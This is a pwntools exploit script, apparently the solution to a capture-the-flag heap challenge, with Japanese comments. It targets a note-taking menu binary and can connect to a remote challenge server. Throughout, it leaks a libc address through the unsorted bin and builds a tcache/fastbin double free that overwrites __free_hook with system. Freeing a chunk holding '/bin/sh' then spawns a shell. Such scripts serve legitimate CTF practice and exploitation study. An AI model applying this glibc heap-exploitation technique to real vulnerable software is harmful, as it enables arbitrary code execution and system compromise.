from pwn import *

exe = ELF('./chall_patched')
libc = ELF('./libc.so.6')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main+599
        continue
    """)
elif args.REMOTE:
    io = remote("20.55.48.101", "1339")

# ************************************
# libc leak
# ************************************
io.sendlineafter(b'5. Exit\n', b'10')
io.sendlineafter(b'Enter the note', b'AAA')

# top との統合を防ぐ
io.sendlineafter(b'5. Exit\n', b'1')
io.sendlineafter(b'Enter the note', b'AAA')

# unsorted bin に入る
io.sendlineafter(b'5. Exit\n', b'2')
io.sendlineafter(b'?', b'1')

# unsort のアドレス leak
io.sendlineafter(b'5. Exit\n', b'4')
io.sendlineafter(b'?', b'1')
io.recvline()
unsort = int.from_bytes(io.recvline().strip(), byteorder='little')

# libc base 特定
# pwndbg> p system
# $1 = {int (const char *)} 0x7f3f9cb94d70 <__libc_system>
system = unsort - 1664976
libc.address = system - libc.sym['system']
print(f"libc base: {hex(libc.address)}")
print(f"system: {hex(system)}")
print(f"free_hook: {hex(libc.sym['__free_hook'])}")

# ************************************
# double free
# ************************************

# unsorted bin から使う
io.sendlineafter(b'5. Exit\n', b'10')
io.sendlineafter(b'Enter the note', b'AAA')

# tcache に 2 つ入れる
for _ in range(9):
    io.sendlineafter(b'5. Exit\n', b'1')
    io.sendlineafter(b'Enter the note', b'AAA')

for i in range(9):
    io.sendlineafter(b'5. Exit\n', b'2')
    io.sendlineafter(b'?', str(3 + i + 1).encode())

# 11, 12 で fastbin の double free
io.sendlineafter(b'5. Exit\n', b'2')
io.sendlineafter(b'?', b'11')

# before: [11] -> [12] -> [11] -> ...
for _ in range(8):
    io.sendlineafter(b'5. Exit\n', b'1')
    io.sendlineafter(b'Enter the note', pack(libc.symbols.__free_hook))
# after: [12] -> [11] -> free_hook

# before: [12] -> [11] -> free_hook
for _ in range(3):
    io.sendlineafter(b'5. Exit\n', b'1')
    io.sendlineafter(b'Enter the note', pack(libc.symbols.system))
# after: free_hook -> system

# free して /bin/sh を呼ぶ
io.sendlineafter(b'5. Exit\n', b'3')
io.sendlineafter(b'?', b'1')
io.sendline(b'/bin/sh')
io.sendlineafter(b'5. Exit\n', b'2')
io.sendlineafter(b'?', b'1')

io.interactive()
